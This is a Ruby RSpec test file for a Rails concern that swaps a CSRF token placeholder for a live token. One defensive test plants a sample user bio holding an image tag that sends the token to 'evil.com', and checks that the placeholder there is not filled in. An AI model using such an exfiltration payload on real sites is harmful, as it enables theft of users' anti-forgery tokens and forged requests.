# frozen_string_literal: true

require "spec_helper"

describe CsrfTokenInjector, type: :controller do
  controller do
    include CsrfTokenInjector

    def action
      html_body = <<-HTML
      <html>
        <head>
          <meta name="csrf-param" content="authenticity_token">
          <meta name="csrf-token" content="_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__">
        </head>
        <body></body>
      </html>
      HTML

      render inline: html_body
    end
  end

  before do
    routes.draw { get :action, to: "anonymous#action" }

    # mocking here instead of including `protect_from_forgery` in the anonymous controller because protection against forgery is disabled in test environment
    allow_any_instance_of(ActionController::Base).to receive(:protect_against_forgery?).and_return(true)
  end

  it "replaces CSRF token placeholder with dynamic value" do
    get :action

    expect(response.body).not_to include("_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__")
    expect(Nokogiri::HTML(response.body).at_xpath("//meta[@name='csrf-token']/@content").value).to be_present
  end

  describe "CSRF token exfiltration prevention" do
    controller do
      include CsrfTokenInjector

      def action_with_user_content
        user_bio = '<img src="https://evil.com/exfil?t=_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__">'

        html_body = <<-HTML
        <html>
          <head>
            <meta name="csrf-param" content="authenticity_token">
            <meta name="csrf-token" content="_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__">
          </head>
          <body>
            <div class="user-bio">#{user_bio}</div>
          </body>
        </html>
        HTML

        render inline: html_body
      end
    end

    before do
      routes.draw { get :action_with_user_content, to: "anonymous#action_with_user_content" }
      allow_any_instance_of(ActionController::Base).to receive(:protect_against_forgery?).and_return(true)
    end

    it "does not replace placeholder in user-controlled content" do
      get :action_with_user_content

      doc = Nokogiri::HTML(response.body)

      meta_token = doc.at_xpath("//meta[@name='csrf-token']/@content").value
      expect(meta_token).to be_present
      expect(meta_token).not_to eq("_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__")

      user_bio_content = doc.at_css(".user-bio").inner_html
      expect(user_bio_content).to include("_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__")
    end
  end
end
